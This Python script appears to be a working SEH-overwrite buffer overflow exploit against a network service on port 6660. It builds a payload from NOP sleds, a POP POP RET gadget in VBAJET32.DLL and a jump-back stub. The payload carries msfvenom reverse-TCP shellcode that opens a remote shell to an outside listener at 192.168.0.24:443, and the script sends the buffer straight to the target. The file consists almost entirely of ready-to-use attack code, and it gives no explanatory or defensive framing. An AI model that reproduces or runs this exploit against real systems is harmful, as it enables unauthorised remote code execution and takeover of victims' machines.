#!/usr/bin/python

import socket
import struct

target_address = "192.168.0.14"
target_port = 6660

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

eip = struct.pack("<I", 0x0F9A196A) # SEH Overwrite 0x0F9A196A POP EBP, POP EBX, RETN, VBAJET32.DLL 

buffer = "USV "
buffer += "\x90" * 194
buffer += "\x90" * 16 # Jump code lands here on 16 NOPs
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.24 LPORT=443 -e x86/shikata_ga_nai -a x86 -b "\x00\x0a\x0d\x20\x25" -f c
buffer += ("\xb8\x7b\x78\x9d\x43\xdd\xc6\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x52\x31\x47\x12\x03\x47\x12\x83\x94\x84\x7f\xb6\x96\x9d\x02"
"\x39\x66\x5e\x63\xb3\x83\x6f\xa3\xa7\xc0\xc0\x13\xa3\x84\xec"
"\xd8\xe1\x3c\x66\xac\x2d\x33\xcf\x1b\x08\x7a\xd0\x30\x68\x1d"
"\x52\x4b\xbd\xfd\x6b\x84\xb0\xfc\xac\xf9\x39\xac\x65\x75\xef"
"\x40\x01\xc3\x2c\xeb\x59\xc5\x34\x08\x29\xe4\x15\x9f\x21\xbf"
"\xb5\x1e\xe5\xcb\xff\x38\xea\xf6\xb6\xb3\xd8\x8d\x48\x15\x11"
"\x6d\xe6\x58\x9d\x9c\xf6\x9d\x1a\x7f\x8d\xd7\x58\x02\x96\x2c"
"\x22\xd8\x13\xb6\x84\xab\x84\x12\x34\x7f\x52\xd1\x3a\x34\x10"
"\xbd\x5e\xcb\xf5\xb6\x5b\x40\xf8\x18\xea\x12\xdf\xbc\xb6\xc1"
"\x7e\xe5\x12\xa7\x7f\xf5\xfc\x18\xda\x7e\x10\x4c\x57\xdd\x7d"
"\xa1\x5a\xdd\x7d\xad\xed\xae\x4f\x72\x46\x38\xfc\xfb\x40\xbf"
"\x03\xd6\x35\x2f\xfa\xd9\x45\x66\x39\x8d\x15\x10\xe8\xae\xfd"
"\xe0\x15\x7b\x51\xb0\xb9\xd4\x12\x60\x7a\x85\xfa\x6a\x75\xfa"
"\x1b\x95\x5f\x93\xb6\x6c\x08\x5c\xee\x6e\xd0\x34\xed\x6e\xe1"
"\x7f\x78\x88\x8b\x6f\x2d\x03\x24\x09\x74\xdf\xd5\xd6\xa2\x9a"
"\xd6\x5d\x41\x5b\x98\x95\x2c\x4f\x4d\x56\x7b\x2d\xd8\x69\x51"
"\x59\x86\xf8\x3e\x99\xc1\xe0\xe8\xce\x86\xd7\xe0\x9a\x3a\x41"
"\x5b\xb8\xc6\x17\xa4\x78\x1d\xe4\x2b\x81\xd0\x50\x08\x91\x2c"
"\x58\x14\xc5\xe0\x0f\xc2\xb3\x46\xe6\xa4\x6d\x11\x55\x6f\xf9"
"\xe4\x95\xb0\x7f\xe9\xf3\x46\x9f\x58\xaa\x1e\xa0\x55\x3a\x97"
"\xd9\x8b\xda\x58\x30\x08\xea\x12\x18\x39\x63\xfb\xc9\x7b\xee"
"\xfc\x24\xbf\x17\x7f\xcc\x40\xec\x9f\xa5\x45\xa8\x27\x56\x34"
"\xa1\xcd\x58\xeb\xc2\xc7")
buffer += "\x90" * (966 - len(buffer))
buffer += "\xeb\x06\x90\x90" # JMP SHORT 6, NOP padding
buffer += eip # SEH Overwrite at 0x0F9A196A, POP EBP, POP EBX, RETN, VBAJET32.DLL
buffer += "\x59\x59\x59\xfe\xcd\xfe\xcd\xfe\xcd\xff\xe1" # 11 bytes, POP ECX * 3, DEC CH (take 256 from ECX) * 3, JMP ECX
buffer += "\x90" * (2504 - len(buffer))
buffer += "\r\n\r\n"

try:
    print "\nSending evil buffer..."
    s.connect((target_address, target_port))
    s.send(buffer)
    s.close()
    print "\nDone!."
except:
    print "Could not connect to target server!"

